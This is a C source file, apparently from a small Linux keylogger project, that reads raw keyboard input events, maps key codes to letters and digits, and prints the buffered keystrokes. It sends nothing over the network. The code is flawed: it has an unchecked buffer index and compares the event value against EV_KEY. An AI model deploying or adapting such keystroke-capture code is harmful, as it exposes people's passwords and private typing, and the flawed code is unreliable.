#include "keylogger.h"


char get_char_from_event_code(u16 code)
{
	switch(code)
	{
		case KEY_Q: return 'q';
		case KEY_W: return 'w';
		case KEY_E: return 'e';
		case KEY_R: return 'r';
		case KEY_T: return 't';
		case KEY_Y: return 'y';
		case KEY_U: return 'u';
		case KEY_I: return 'i';
		case KEY_O: return 'o';
		case KEY_P: return 'p';

		case KEY_A: return 'a';
		case KEY_S: return 's';
		case KEY_D: return 'd';
		case KEY_F: return 'f';
		case KEY_G: return 'g';
		case KEY_H: return 'h';
		case KEY_J: return 'j';
		case KEY_K: return 'k';
		case KEY_L: return 'l';
		case KEY_Z: return 'z';

		case KEY_X: return 'x';
		case KEY_C: return 'c';
		case KEY_V: return 'v';
		case KEY_B: return 'b';
		case KEY_N: return 'n';
		case KEY_M: return 'm';
	  	
		case KEY_1: return '1';
		case KEY_2: return '2';
		case KEY_3: return '3';
		case KEY_4: return '4';
		case KEY_5: return '5';
		case KEY_6: return '6';
		case KEY_7: return '7';
		case KEY_8: return '8';
		case KEY_9: return '9';
		case KEY_0: return '0';

		case KEY_DOT: return '.';
		case KEY_COMMA: return ',';
		case KEY_SEMICOLON: return ';';
	}

	return -1;
}

void print(const char c)
{
	// this buffer acts like a volatily cache, when an invalif character is sent
	// buffers cleanup.
	static char buffer[MAX_BUFFER_SIZE];
	static int counter = 0;

	if(c == -1)
	{
		PRINT(STATUS, "[%s]\n", buffer);
		memset(buffer, 0, MAX_BUFFER_SIZE);
		counter = 0;
	}
	else
	{
		buffer[counter++] = c;
	}
}

void event_loop(int filedescriptor)
{
	int rd, event_len = 64, infinite = 1;
	struct input_event event[event_len];

	while(infinite)
	{
		if((rd = read(filedescriptor, event, sizeof(struct input_event) * event_len)) == -1)
		{
			PRINT(ERROR, "cannot read keyboard input events");
			exit(1);
  		}

  		for (int i = 0; i < rd / sizeof(struct input_event); i++)
  		{
  			if(event[i].value == EV_KEY)
  			{
  				print(get_char_from_event_code(event[i].code));
  			}
  		}
  	}
}
